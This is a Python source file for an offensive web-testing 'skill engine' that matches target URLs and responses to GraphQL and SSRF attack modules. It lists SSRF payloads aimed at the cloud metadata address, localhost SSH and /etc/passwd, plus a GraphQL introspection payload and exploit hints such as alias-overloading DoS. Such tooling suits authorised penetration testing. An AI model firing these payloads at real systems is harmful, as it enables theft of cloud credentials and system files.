class BaseSkill:
    name = "base_skill"
    description = "Base skill template"
    
    def __init__(self):
        self.payloads = []
        self.detection_heuristics = []
        self.related_tools = []

    def get_recon_logic(self) -> list:
        return []

    def get_exploit_suggestions(self, context: dict) -> list:
        return []

class GraphQLSkill(BaseSkill):
    name = "graphql"
    description = "Offensive GraphQL enumeration and exploitation"

    def __init__(self):
        super().__init__()
        self.detection_heuristics = [
            "/graphql",
            "/v1/graphql",
            "query{",
            "mutation{",
            "Apollo"
        ]
        self.related_tools = ["nuclei -t graphql/", "inql"]
        self.payloads = [
            '{"query":"query{\\n  __schema {\\n    queryType {\\n      name\\n    }\\n  }\\n}"}'
        ]

    def get_recon_logic(self):
        return [
            {"trigger": "endpoint_found", "condition": "contains_graphql", "action": "test_introspection"},
            {"trigger": "introspection_open", "action": "extract_schema"},
            {"trigger": "schema_extracted", "action": "fuzz_mutations"}
        ]

    def get_exploit_suggestions(self, context: dict):
        return [
            "Attempt Introspection Query to map schema.",
            "Test for Alias Overloading (DoS).",
            "Check for Broken Object Level Authorization (BOLA) in mutations."
        ]

class SSRFSkill(BaseSkill):
    name = "ssrf"
    description = "Server-Side Request Forgery"
    
    def __init__(self):
        super().__init__()
        self.detection_heuristics = ["?url=", "?redirect=", "?target=", "?host="]
        self.related_tools = ["interactsh-client", "ffuf -w ssrf_payloads.txt"]
        self.payloads = [
            "http://169.254.169.254/latest/meta-data/",
            "http://localhost:22",
            "file:///etc/passwd"
        ]

class SkillEngine:
    def __init__(self):
        self.skills = {
            "graphql": GraphQLSkill(),
            "ssrf": SSRFSkill()
        }

    def evaluate_target(self, endpoint_url: str, response_body: str):
        matched_skills = []
        for name, skill in self.skills.items():
            for h in skill.detection_heuristics:
                if h in endpoint_url or h in response_body:
                    matched_skills.append(skill)
                    break
        return matched_skills
